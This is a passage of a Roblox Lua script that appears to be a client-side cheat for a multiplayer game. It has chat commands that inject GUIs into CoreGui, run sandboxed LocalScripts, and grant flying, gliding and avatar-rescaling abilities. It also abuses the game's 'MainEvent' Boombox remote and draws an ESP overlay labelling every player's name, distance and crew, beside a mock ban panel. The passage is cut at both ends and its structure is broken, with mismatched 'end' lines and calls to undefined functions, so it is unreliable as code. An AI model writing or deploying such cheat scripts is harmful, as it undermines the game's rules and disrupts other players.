	sound5.SoundId = "rbxassetid://2952274135"
	Sound3.Volume = 0.69999998807907
	Animation4.Name = "Hover"
	Animation4.Parent = LocalScript1
	Animation4.AnimationId = "rbxassetid://3541114300"
	RemoteEvent5.Name = "re"
	RemoteEvent5.Parent = LocalScript1
	Animation6.Name = "Fly"
	Animation6.Parent = LocalScript1
	Animation6.AnimationId = "rbxassetid://3541044388"
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end
game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
wait(1)
Fly()
game.Players.LocalPlayer.CharacterAdded:connect(function()
	game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
	wait(1)
	Fly()
end)
function Hearing()
	function sandbox(var,func)
		local env = getfenv(func)
		local newenv = setmetatable({},{
			__index = function(self,k)
				if k=="script" then
					return var
				else
					return env[k]
				end
			end,
		})
		setfenv(func,newenv)
		return func
	end
	cors = {}
	mas = Instance.new("Model",game:GetService("Lighting"))
	Tool0 = Instance.new("Tool")
	LocalScript1 = Instance.new("LocalScript")
	BillboardGui2 = Instance.new("BillboardGui")
	ImageLabel3 = Instance.new("ImageLabel")
	ScreenGui4 = Instance.new("ScreenGui")
	TextLabel5 = Instance.new("TextLabel")
	ScreenGui6 = Instance.new("ScreenGui")
	ImageLabel7 = Instance.new("ImageLabel")
	Tool0.Name = "Hearing"
	Tool0.Parent = mas
	Tool0.CanBeDropped = false
	Tool0.RequiresHandle = false
	LocalScript1.Parent = Tool0
	table.insert(cors,sandbox(LocalScript1,function()
		wait();
		local l__LocalPlayer__1 = game.Players.LocalPlayer;
		while true do
			wait();
			if l__LocalPlayer__1.Character then
				break;
			end;
		end;
		local l__Character__2 = l__LocalPlayer__1.Character;
		local u1 = false;
		local l__PlayerGui__2 = game.CoreGui;
		function ChatFunc(p1)
			local v3 = p1.Chatted:connect(function(p2)
				if u1 then
					local v4 = BrickColor.Random();
					local v5 = script.MsgGui:Clone();
					if string.find(string.lower(p2), "super") then
						v5.Msg.TextSize = 29;
					end;
					v5.Msg.Text = p1.Name .. ": " .. p2;
					v5.Msg.TextColor3 = v4.Color;
					v5.Msg.Position = UDim2.new(0.5, math.random(-350, 350), 0.5, math.random(-210, 250));
					v5.Parent = l__PlayerGui__2;
					local v6 = script.DotGui:Clone();
					v6.Dot.ImageColor3 = v4.Color;
					v6.Enabled = true;
					if p1.Character then
						if p1.Character:findFirstChild("Head") then
							v6.Parent = p1.Character.Head;
						end;
					end;
					spawn(function()
						local v7 = 1 - 1;
						while true do
							v6.Size = v6.Size - UDim2.new(0, 1, 0, 1);
							game:GetService("RunService").RenderStepped:wait();
							if 0 <= 1 then
								if v7 < 70 then

								else
									break;
								end;
							elseif 70 < v7 then

							else
								break;
							end;
							v7 = v7 + 1;				
						end;
					end);
					game.Debris:AddItem(v5, 3);
					game.Debris:AddItem(v6, 6);
				end;
			end);
		end;
		for v8, v9 in pairs(game.Players:GetChildren()) do
			ChatFunc(v9);
		end;
		game.Players.PlayerAdded:connect(function(p3)
			ChatFunc(p3);
		end);
		local u3 = false;
		local u4 = nil;
		script.Parent.Equipped:connect(function(p4)
			p4.Button1Down:connect(function()
				if u3 then
					return;
				end;
				u3 = true;
				if not u1 then
					u4 = script.Frame:Clone();
					u4.Parent = l__PlayerGui__2;
					u1 = true;
				else
					u4:Destroy();
					u1 = false;
				end;
				wait(1);
				u3 = false;
			end);
		end);
	end))
	BillboardGui2.Name = "DotGui"
	BillboardGui2.Parent = LocalScript1
	BillboardGui2.Enabled = false
	BillboardGui2.Size = UDim2.new(0, 90, 0, 90)
	BillboardGui2.Active = true
	BillboardGui2.ClipsDescendants = true
	BillboardGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	BillboardGui2.AlwaysOnTop = true
	ImageLabel3.Name = "Dot"
	ImageLabel3.Parent = BillboardGui2
	ImageLabel3.Size = UDim2.new(1, 0, 1, 0)
	ImageLabel3.BackgroundColor = BrickColor.new("Institutional white")
	ImageLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel3.BackgroundTransparency = 1
	ImageLabel3.Image = "rbxassetid://130424513"
	ImageLabel3.ImageColor3 = Color3.new(1, 0, 0)
	ScreenGui4.Name = "MsgGui"
	ScreenGui4.Parent = LocalScript1
	ScreenGui4.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	TextLabel5.Name = "Msg"
	TextLabel5.Parent = ScreenGui4
	TextLabel5.Position = UDim2.new(0, 300, 0, 25)
	TextLabel5.Size = UDim2.new(0, 1, 0, 1)
	TextLabel5.BackgroundColor = BrickColor.new("Institutional white")
	TextLabel5.BackgroundColor3 = Color3.new(1, 1, 1)
	TextLabel5.BackgroundTransparency = 1
	TextLabel5.Font = Enum.Font.SourceSansBold
	TextLabel5.FontSize = Enum.FontSize.Size28
	TextLabel5.Text = ""
	TextLabel5.TextColor = BrickColor.new("Really black")
	TextLabel5.TextColor3 = Color3.new(0, 0, 0)
	TextLabel5.TextSize = 25
	TextLabel5.TextStrokeTransparency = 0.60000002384186
	ScreenGui6.Name = "Frame"
	ScreenGui6.Parent = LocalScript1
	ScreenGui6.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ImageLabel7.Name = "Image"
	ImageLabel7.Parent = ScreenGui6
	ImageLabel7.Size = UDim2.new(1, 0, 1, 0)
	ImageLabel7.BackgroundColor = BrickColor.new("Institutional white")
	ImageLabel7.BackgroundColor3 = Color3.new(1, 1, 1)
	ImageLabel7.BackgroundTransparency = 1
	ImageLabel7.Image = "rbxassetid://36869195"
	ImageLabel7.ImageColor3 = Color3.new(0.290196, 1, 0.917647)
	ImageLabel7.ImageTransparency = 0.80000001192093
	for i,v in pairs(mas:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
		pcall(function() v:MakeJoints() end)
	end
	mas:Destroy()
	for i,v in pairs(cors) do
		spawn(function()
			pcall(v)
		end)
	end
end
game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
wait(1)
Hearing()
game.Players.LocalPlayer.CharacterAdded:connect(function()
	game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
	wait(1)
	Hearing()
end)
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".hulk" then
local function rm()
    for i, v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
        if v.Name == "OriginalPosition" then
            v:Destroy()
        elseif v.Name == "OriginalSize" then
            v:Destroy()
        elseif v.Name == "AvatarPartScaleType" then
            v:Destroy()
        end
    end
end
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == "Hulk!" then
rm()
local HulkAnim = Instance.new("Animation", game.ReplicatedStorage.ClientAnimations)
HulkAnim.AnimationId = "rbxassetid://2788838708"game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(HulkAnim):Play()
        wait(0.30)
        play(8099554944, true, true)
wait(0.5)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
wait(0.6)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(0.6)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(0.6)

rm()
wait(0.5)
Humanoid:FindFirstChild("HeadScale"):Destroy()
wait(0.6)
    end
end)
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".panel" then
        local UserInputService = game:GetService("UserInputService")
local ScreenGui = Instance.new("ScreenGui", game.CoreGui) ScreenGui.Name = "ModMenu"
local Frame = Instance.new("Frame", ScreenGui)
local Main = Instance.new("ScrollingFrame", ScreenGui)
Main.Size = UDim2.new(0.3, 0, 0.4, 0)
Main.Position = UDim2.new(0.65, 0, 0.2, 0)
ScreenGui.Parent = nil
local MainEvent = game.ReplicatedStorage.MainEvent
local CurrentCamera = workspace.CurrentCamera
local Plr = game.Players.LocalPlayer
function enableGUI()
    local v5 = 0
    local players = game.Players:GetChildren()

    table.sort(players, function(p1, p2)
        return p1:GetFullName() < p2:GetFullName()
    end)

    local v7, v8, v9 = pairs(players)
    while true do
        local v10, Target = v7(v8, v9)
        if not v10 then
            break
        end
        v9 = v10
        local FFAa = Instance.new("Frame")
        local UserID = Instance.new("TextBox")
        local Unban = Instance.new("TextButton")
        local ID2 = Instance.new("TextBox")
        local PERMA = Instance.new("TextButton")
        local JoinServer = Instance.new("TextButton")
        local ServerID = Instance.new("TextBox")
        local PlayerName = Instance.new("TextBox")
        local FindServerID = Instance.new("TextButton")
        
        
        FFAa.Parent = ScreenGui
        FFAa.AnchorPoint = Vector2.new(0, 0.25)
        FFAa.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        FFAa.BackgroundTransparency = 1.000
        FFAa.Position = UDim2.new(0.649999976, 0, 0.200000003, -75)
        FFAa.Size = UDim2.new(0.300000012, 0, 0, 75)
        
        UserID.Name = "UserID"
        UserID.Parent = FFAa
        UserID.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        UserID.Position = UDim2.new(0.5, 0, 0.85833329, 0)
        UserID.Size = UDim2.new(0.5, 0, 0.349999994, 0)
        UserID.Font = Enum.Font.SourceSans
        UserID.Text = "UserID"
        UserID.TextColor3 = Color3.fromRGB(0, 0, 0)
        UserID.TextScaled = true
        UserID.TextSize = 14.000
        UserID.TextWrapped = true
        
        
        Unban.Name = "Unban"
        Unban.Parent = FFAa
        Unban.BackgroundColor3 = Color3.fromRGB(200, 168, 155)
        Unban.Position = UDim2.new(0, 0, 0.858333349, 0)
        Unban.Size = UDim2.new(0.5, 0, 0.349999994, 0)
        Unban.Font = Enum.Font.SourceSans
        Unban.Text = "UNBAN"
        Unban.TextColor3 = Color3.fromRGB(0, 0, 0)
        Unban.TextScaled = true
        Unban.TextSize = 14.000
        Unban.TextWrapped = true

        ID2.Name = "ID2"
        ID2.Parent = FFAa
        ID2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ID2.Position = UDim2.new(0.5, 0, 0.498333395, 0)
        ID2.Size = UDim2.new(0.5, 0, 0.349999994, 0)
        ID2.Font = Enum.Font.SourceSans
        ID2.Text = "UserID"
        ID2.TextColor3 = Color3.fromRGB(0, 0, 0)
        ID2.TextScaled = true
        ID2.TextSize = 14.000
        ID2.TextWrapped = true
        
        PERMA.Name = "PERMA"
        PERMA.Parent = FFAa
        PERMA.BackgroundColor3 = Color3.fromRGB(200, 81, 81)
        PERMA.Position = UDim2.new(0, 0, 0.511666715, 0)
        PERMA.Size = UDim2.new(0.5, 0, 0.349999994, 0)
        PERMA.Font = Enum.Font.SourceSans
        PERMA.Text = "PERMA"
        PERMA.TextColor3 = Color3.fromRGB(0, 0, 0)
        PERMA.TextScaled = true
        PERMA.TextSize = 14.000
        PERMA.TextWrapped = true
        
        JoinServer.Name = "JoinServer"
        JoinServer.Parent = FFAa
        JoinServer.BackgroundColor3 = Color3.fromRGB(113, 118, 186)
        JoinServer.BorderColor3 = Color3.fromRGB(27, 42, 53)
        JoinServer.Position = UDim2.new(0, 0, 0.0399999991, 0)
        JoinServer.Size = UDim2.new(0, 288, 0, 35)
        JoinServer.Font = Enum.Font.SourceSans
        JoinServer.Text = "Join Server"
        JoinServer.TextColor3 = Color3.fromRGB(0, 0, 0)
        JoinServer.TextScaled = true
        JoinServer.TextSize = 14.000
        JoinServer.TextWrapped = true
        
        ServerID.Name = "ServerID"
        ServerID.Parent = FFAa
        ServerID.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        ServerID.Position = UDim2.new(0, 289, 0, 0)
        ServerID.Size = UDim2.new(0, 287, 0, 38)
        ServerID.Font = Enum.Font.SourceSans
        ServerID.Text = ""
        ServerID.TextColor3 = Color3.fromRGB(0, 0, 0)
        ServerID.TextScaled = true
        ServerID.TextSize = 14.000
        ServerID.TextWrapped = true
        
        PlayerName.Name = "PlayerName"
        PlayerName.Parent = FFAa
        PlayerName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        PlayerName.Position = UDim2.new(0.495555431, 0, -0.426666677, 0)
        PlayerName.Size = UDim2.new(0.504444599, 0, 0.461666763, 0)
        PlayerName.Font = Enum.Font.SourceSans
        PlayerName.Text = "PlayerName"
        PlayerName.TextColor3 = Color3.fromRGB(0, 0, 0)
        PlayerName.TextScaled = true
        PlayerName.TextSize = 14.000
        PlayerName.TextWrapped = true
        
        FindServerID.Name = "FindServerID"
        FindServerID.Parent = FFAa
        FindServerID.BackgroundColor3 = Color3.fromRGB(172, 255, 94)
        FindServerID.BorderColor3 = Color3.fromRGB(27, 42, 53)
        FindServerID.Position = UDim2.new(0, 0, -0.426666677, 0)
        FindServerID.Size = UDim2.new(0, 288, 0, 35)
        FindServerID.Font = Enum.Font.SourceSans
        FindServerID.Text = "Find Player Server ID"
        FindServerID.TextColor3 = Color3.fromRGB(0, 0, 0)
        FindServerID.TextScaled = true
        FindServerID.TextSize = 14.000
        FindServerID.TextWrapped = true

        local v12 = Instance.new("TextButton")
        v12.Size = UDim2.new(0.25, 0, 0, 45)
        v12.Position = UDim2.new(0, 0, 0, v5 * 50)
        v12.BackgroundColor3 = BrickColor.Red().Color
        v12.Text = Target.Name
        v12.TextScaled = true
        v12.Parent = Main
    
        local View = v12:Clone()
        View.Text = "Spectate"
        View.Position = UDim2.new(0.75, 0, 0, v5 * 50)
        View.Size = UDim2.new(0.25, 0, 0, 45)
        View.BackgroundColor3 = BrickColor.White().Color
        View.Parent = Main
        
        local v14 = v12:Clone()
        v14.Size = UDim2.new(0.25, 0, 0, 45)
        v14.Position = UDim2.new(0.25, 0, 0, v5 * 50)
        v14.BackgroundColor3 = BrickColor.Green().Color
        v14.Text = "UnBan"
        v14.Parent = Main

        local v15 = Instance.new("TextBox")
        v15.Size = UDim2.new(0.25, 0, 0, 45)
        v15.Position = UDim2.new(0.5, 0, 0, v5 * 50)
        v15.Text = "Ban/UnBan Note Here"
        v15.Font = v12.Font
        v15.TextScaled = true
        v15.Parent = Main

        v5 = v5 + 1
        local u4 = false
        v12.MouseButton1Click:connect(function()
            if u4 == false then
                u4 = true
                Target:Destroy()
                wait(0.5)
                u4 = false
            end
        end)
        

        View.MouseButton1Click:connect(function()
            CurrentCamera.CameraSubject = Target.Character.Humanoid
        end)
    end
    Main.CanvasSize = UDim2.new(0, 0, 0, v5 * 50)
    ScreenGui.Parent = game.Players.LocalPlayer.PlayerGui
end

enableGUI()
--Frame.FindServer.MouseButton1Click:connect(function()
--	MainEvent:FireServer("FindServer", Frame.PlayerName.Text)
--end)
--Frame.JoinServer.MouseButton1Click:connect(function()
--	MainEvent:FireServer("JoinServer", Frame.ServerId.Text)
--end)
local u5 = false
UserInputService.InputBegan:connect(function(p3, p4)
    if not p4 and p3.UserInputType == Enum.UserInputType.Keyboard and p3.KeyCode == Enum.KeyCode.B and u5 == false then
        u5 = true
        if ScreenGui.Parent == nil then
            enableGUI()
        else
            ScreenGui.Parent = nil
            for v16, v17 in pairs(Main:GetChildren()) do
                v17:Destroy()
            end
        end
        wait(0.2)
        u5 = false
    end
end)
local v18 = {}
local u22 = {}
while wait() do
    if ScreenGui.Parent == Plr.PlayerGui then
        for v19 = #v18, 1, -1 do
            v18[v19]:Destroy()
            table.remove(v18, v19)
        end
        for v20, v21 in pairs(game.Players:GetChildren()) do
            pcall(function()
                local l__Character__22 = v21.Character
                if CurrentCamera.CFrame.lookVector:Dot((l__Character__22.LowerTorso.Position - CurrentCamera.CFrame.p).unit) > 0 then
                    local v23 = CurrentCamera:WorldToScreenPoint(l__Character__22.UpperTorso.Position)
                    local v24 = Instance.new("TextLabel")
                    v24.Name = l__Character__22.Name
                    local v25 = game.Players:GetPlayerFromCharacter(l__Character__22)
                    v24.Text = l__Character__22.Name
                    v24.TextSize = 20
                    v24.Font = Enum.Font.ArialBold
                    v24.TextColor3 = (CurrentCamera.CFrame.p - l__Character__22.LowerTorso.Position).magnitude < 75 and Color3.fromRGB(137, 211, 205) or Color3.new(1, 0, 0)
                    v24.Position = UDim2.new(0, v23.x, 0, v23.y)
                    if v21:FindFirstChild("DataFolder") and v21.DataFolder:FindFirstChild("Information") and (v21.DataFolder.Information:FindFirstChild("Crew") and v21.DataFolder.Information.Crew.Value and tonumber(v21.DataFolder.Information.Crew.Value)) then
                        u22[v21.Name] = u22[v21.Name] or game:GetService("GroupService"):GetGroupInfoAsync(tonumber(v21.DataFolder.Information.Crew.Value)).Name
                        v24.Text = v24.Text .. "\n" .. u22[v21.Name]
                    end
                    v24.Parent = ScreenGui
                    table.insert(v18, v24)
                end
            end)
        end
    end
end
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".glide" then
        local outfit = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
        outfit.Name = "Glide"
        outfit.RequiresHandle = false
        local player = game.Players.LocalPlayer
        while true do
            wait()
            if player.Character then
                break
            end
        end
        local Animation = Instance.new("Animation")
        Animation.AnimationId = "rbxassetid://3084858603"
        local char = player.Character
        local Humanoid = char:WaitForChild("Humanoid")
        local tool = outfit
        local u1 = false
        local u3 = false
        local u4 = Humanoid:LoadAnimation(Animation)
        tool.Equipped:connect(function(p1)
            p1.Button1Down:connect(function()
                if u1 or Humanoid.FloorMaterial ~= Enum.Material.Air then
                    return
                end
                u1 = true
                u3 = true
                u4:Play()
                local v5 = Instance.new("BodyVelocity", char.HumanoidRootPart)
                v5.MaxForce = Vector3.new(50000, 50000, 50000)
                v5.Velocity = (char.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(-18), 0, 0)).lookVector * 40
                while u3 and Humanoid.FloorMaterial == Enum.Material.Air do
                    v5.Velocity = (char.HumanoidRootPart.CFrame * CFrame.Angles(math.rad(-18), 0, 0)).lookVector * 40
                    game:GetService("RunService").Heartbeat:wait()
                end
                v5:Destroy()
                u3 = false
                u4:Stop()
                wait(0.3)
                u1 = false
            end)
            p1.Button1Up:connect(function()
                u3 = false
            end)
        end)
        tool.Unequipped:connect(function()
            u3 = false
        end)
        local LocalPlayer = game:GetService("Players").LocalPlayer
        local Mouse = LocalPlayer:GetMouse()
        local OriginalKeyUpValue = 0
        
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://2788838708"
        
        function StopAudio()
            LocalPlayer.Character.LowerTorso.BOOMBOXSOUND:Stop()
        end
        
        function stop(ID, Key)
            local cor = coroutine.wrap(function()
                wait(LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength-0.1)
                if LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and OriginalKeyUpValue == Key then
                    StopAudio()
                end
            end)
            cor()
        end
        
        function play(ID, STOP, LMAO)
            if LocalPlayer.Backpack:FindFirstChild("[Boombox]") then
                local Tool = nil
                if LocalPlayer.Character:FindFirstChildOfClass("Tool") and LMAO == true then
                    Tool = LocalPlayer.Character:FindFirstChildOfClass("Tool")
                    LocalPlayer.Character:FindFirstChildOfClass("Tool").Parent = LocalPlayer.Backpack
                end
                LocalPlayer.Backpack["[Boombox]"].Parent =
                    LocalPlayer.Character
                game.ReplicatedStorage.MainEvent:FireServer("Boombox", ID)
                LocalPlayer.Character["[Boombox]"].RequiresHandle = false
                if LocalPlayer.Character["[Boombox]"]:FindFirstChild("Handle") then
                    LocalPlayer.Character["[Boombox]"].Handle:Destroy()
                end
                LocalPlayer.Character["[Boombox]"].Parent =
                    LocalPlayer.Backpack
                LocalPlayer.PlayerGui.MainScreenGui.BoomboxFrame.Visible = false
                if Tool ~= true then
                    if Tool then
                        Tool.Parent = LocalPlayer.Character
                    end
                end
                if STOP == true then
                    LocalPlayer.Character.LowerTorso:WaitForChild("BOOMBOXSOUND")
                    local cor = coroutine.wrap(function()
                        repeat wait() until LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.SoundId == "rbxassetid://"..ID and LocalPlayer.Character.LowerTorso.BOOMBOXSOUND.TimeLength > 0.01
                        OriginalKeyUpValue = OriginalKeyUpValue+1
                        stop(ID, OriginalKeyUpValue)
                    end)
                    cor()
                end
            end
        end
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".glidefly" then
		Tool()
            function sandbox(var,func)
                local env = getfenv(func)
                local newenv = setmetatable({},{
                    __index = function(self,k)
                        if k=="script" then
                            return var
                        else
                            return env[k]
                        end
                    end,
                })
                setfenv(func,newenv)
                return func
            end
            cors = {}
            mas = Instance.new("Model",game:GetService("Lighting"))
            Tool0 = Instance.new("Tool")
            LocalScript1 = Instance.new("LocalScript")
            Sound2 = Instance.new("Sound")
            Sound3 = Instance.new("Sound")
            Animation4 = Instance.new("Animation")
            RemoteEvent5 = Instance.new("RemoteEvent")
            Animation6 = Instance.new("Animation")
            Tool0.Name = "Fly"
            Tool0.Parent = mas
            Tool0.CanBeDropped = false
            Tool0.RequiresHandle = false
            LocalScript1.Name = "local"
            LocalScript1.Parent = Tool0
            table.insert(cors,sandbox(LocalScript1,function()
                wait();
                local l__LocalPlayer__1 = game.Players.LocalPlayer;
                while true do
                    wait();
                    if l__LocalPlayer__1.Character then
                        break;
                    end;
                end;
                local l__Character__2 = l__LocalPlayer__1.Character;
                local l__Humanoid__3 = l__Character__2:WaitForChild("Humanoid");
                local l__Parent__4 = script.Parent;
                local u1 = false;
                local u2 = l__Humanoid__3:LoadAnimation(script.Hover);
                local u3 = nil;
                local u4 = nil;
                local u5 = false;
                local u6 = false;
                local u7 = l__Humanoid__3:LoadAnimation(script.Fly);
                l__Parent__4.Equipped:connect(function(p1)
                    Sound3:Play()
                    p1.TargetFilter = workspace;
                    u1 = true;
                    u2:Play();
                    u3 = Instance.new("BodyGyro");
                    u3.Name = "NA";
                    u3.Parent = l__Character__2.HumanoidRootPart;
                    u3.MaxTorque = Vector3.new(30000, 0, 30000);
                    u3.P = u3.P * 5;
                    u3.CFrame = CFrame.new(0, 0, 0);
                    u4 = Instance.new("BodyPosition");
                    u4.Name = "NA";
                    u4.Parent = l__Character__2.HumanoidRootPart;
                    u4.MaxForce = Vector3.new(60000, 60000, 60000);
                    u4.Position = l__Character__2.HumanoidRootPart.Position;
                    p1.Button1Down:connect(function()
                        Sound2:Play()
                        if u5 then
                            return;
                        end;
                        u5 = true;
                        u6 = true;
                        u7:Play();
                        local v5 = Instance.new("BodyVelocity", l__Character__2.HumanoidRootPart);
                        v5.MaxForce = Vector3.new(50000, 50000, 50000);
                        v5.Velocity = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p).lookVector * 85;
                        u3.MaxTorque = Vector3.new(30000, 30000, 30000);
                        u3.CFrame = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p);
                        u4.Parent = nil;
                        l__Humanoid__3.AutoRotate = false;
                        if u2.IsPlaying then
                            u2:Stop();
                        end;
                        while u6 do
                            v5.Velocity = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p).lookVector * 85;
                            u3.CFrame = CFrame.new(l__Character__2.HumanoidRootPart.CFrame.p, p1.Hit.p);
                            game:GetService("RunService").Heartbeat:wait();		
                        end;
                        l__Humanoid__3.AutoRotate = true;
                        v5:Destroy();
                        if u4 ~= nil then
                            u4.Position = l__Character__2.HumanoidRootPart.Position;
                            u4.Parent = l__Character__2.HumanoidRootPart;
                        end;
                        if u3 ~= nil then
                            u3.MaxTorque = Vector3.new(30000, 0, 30000);
                            u3.CFrame = CFrame.new(0, 0, 0);
                        end;
                        u6 = false;
                        if u1 then
                            u2:Play();
                        end;
                        u7:Stop();
                        wait(0.3);
                        u5 = false;
                    end);
                    p1.Button1Up:connect(function()
                        Sound2:Stop()
                        Sound3:Play()
                        u6 = false;
                    end);
                end);
                l__Parent__4.Unequipped:connect(function()
                    Sound2:Stop()
                    Sound3:Play()
                    u1 = false;
                    u6 = false;
                    u3:Destroy();
                    u3 = nil;
                    u4:Destroy();
                    u4 = nil;
                    if u2.IsPlaying then
                        u2:Stop();
                    end;
                end);
            end))
            Sound2.Name = "Flapping"
            Sound2.Parent = LocalScript1
            Sound2.Looped = true
            Sound2.MaxDistance = 100
            Sound2.Pitch = 1.5
            Sound2.PlaybackSpeed = 1.5
            Sound2.SoundId = "rbxassetid://1462718291"
            Sound3.Name = "Activation"
            Sound3.Parent = LocalScript1
            Sound3.MaxDistance = 100
            Sound3.SoundId = "rbxassetid://2952274135"
            Sound3.Volume = 0.69999998807907
            Animation4.Name = "Hover"
            Animation4.Parent = LocalScript1
            Animation4.AnimationId = "rbxassetid://3541114300"
            RemoteEvent5.Name = "re"
            RemoteEvent5.Parent = LocalScript1
            Animation6.Name = "Fly"
            Animation6.Parent = LocalScript1
            Animation6.AnimationId = "rbxassetid://3084858603"
            for i,v in pairs(mas:GetChildren()) do
                v.Parent = game.Players.LocalPlayer.Backpack
                pcall(function() v:MakeJoints() end)
            end
            mas:Destroy()
            for i,v in pairs(cors) do
                spawn(function()
                    pcall(v)
                end)
            end
            game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
        Fly()
    end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".Juggernaut" then
                		function Tool()
			local Tool = Instance.new("Tool")
			Tool.Name = "Juggernaut"
			Tool.RequiresHandle = false
			Tool.Activated:Connect(function()
				Humanoid:LoadAnimation(Anim):Play()
				play(862491729, true, true)
				wait(0.4)
				rm()
				Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
				wait(0.2)
		
				rm()
				Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
				wait(0.02)
		
				rm()
				Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
				wait(0.02)
		
				rm()
				Humanoid:FindFirstChild("BodyTypeScale"):Destroy()
				wait(0.02)
			end)
			Tool.Parent = LocalPlayer.Backpack
                		end
end
end)
local Humanoid = game.Players.LocalPlayer.Character.Humanoid
game.Players.LocalPlayer.Chatted:Connect(function(msg)
    if msg == ".Pose" then
        if game:GetService('Players').LocalPlayer.Character:FindFirstChild('Animate'):FindFirstChild('idle'):FindFirstChild('Animation2') then
    game:GetService('Players').LocalPlayer.Character:FindFirstChild('Animate'):FindFirstChild('idle'):FindFirstChild('Animation2'):Destroy();
end;

local Posing = false;
local Key = 0;

local Fashionable = Instance.new('Animation', game:GetService('ReplicatedStorage'):FindFirstChild('ClientAnimations'));
Fashionable.AnimationId = 'rbxassetid://3333331310';
Fashionable.Name = 'Fashionable';

function Play(i, v)
    if game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack'):FindFirstChild('[Boombox]') then
        local Tool = nil;
        if game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool') and v == true then
            Tool = game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool')
            game:GetService('Players').LocalPlayer.Character:FindFirstChildOfClass('Tool').Parent = game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack');
        end;
        game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack'):FindFirstChild('[Boombox]').Parent = game:GetService('Players').LocalPlayer.Character;
        game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('Boombox', i);
        game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]').RequiresHandle = false;
        if game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]'):FindFirstChild('Handle') then
            game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]'):FindFirstChild('Handle'):Destroy();
        end
        game:GetService('Players').LocalPlayer.Character:FindFirstChild('[Boombox]').Parent = game:GetService('Players').LocalPlayer:FindFirstChildOfClass('Backpack')
        if game:GetService('Players').LocalPlayer:FindFirstChildOfClass('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('BoomboxFrame') then
            game:GetService('Players').LocalPlayer:FindFirstChildOfClass('PlayerGui'):FindFirstChild('MainScreenGui'):FindFirstChild('BoomboxFrame').Visible = false;
        end;
        if Tool ~= true then
            if Tool then
                Tool.Parent = game:GetService('Players').LocalPlayer.Character
            end;
        end;
    end;
end;

game:GetService('UserInputService').InputBegan:Connect(function(v, i)
    if not i and v.UserInputType == Enum.UserInputType.Keyboard then
        if v.KeyCode == Enum.KeyCode.Q and Posing == false then
            Play(8121508030, true);
            Posing = true;
            local NoWalkSpeed = Instance.new("IntValue", game.Players.LocalPlayer.Character.BodyEffects.Movement)
        NoWalkSpeed.Name = "NoWalkSpeed"
            repeat
                game:GetService('RunService').Heartbeat:Wait()
                local Pose = game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):LoadAnimation(Fashionable)
                if not Pose.IsPlaying then
                    Pose:Play();
                    Pose.TimePosition = 6;
                    Pose.Looped = true;
                    Pose:AdjustSpeed(0);
                end;
            until Posing == false;
            game:GetService('ReplicatedStorage'):FindFirstChild('MainEvent'):FireServer('BoomboxStop');
            for _, v in pairs(game:GetService('Players').LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                if (v.Animation.AnimationId:match('rbxassetid')) then
                    v:Stop();
                end;
            end;
        game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy()
